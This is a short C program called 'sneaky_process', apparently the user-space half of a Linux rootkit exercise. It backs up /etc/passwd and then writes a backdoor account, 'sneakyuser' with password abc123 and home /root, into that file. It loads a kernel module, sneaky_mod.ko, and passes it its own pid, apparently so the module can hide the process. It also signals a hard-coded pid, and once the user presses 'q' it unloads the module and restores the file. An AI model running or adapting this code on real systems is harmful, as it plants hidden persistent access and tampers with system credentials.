#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    int my_pid = getpid();

    printf("sneaky_process pid = %d\n", my_pid);
    system("cp /etc/passwd /tmp");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
    char insmod[50];
    sprintf(insmod, "insmod ./sneaky_mod.ko my_pid=%d", my_pid);
    system(insmod);
    system("kill -60 1234");


    while (getchar() != 'q') ;


    system("kill -60 1234");
    system("rmmod sneaky_mod");
    system("cp /tmp/passwd /etc");
    system("rm /tmp/passwd");


    return 0;
}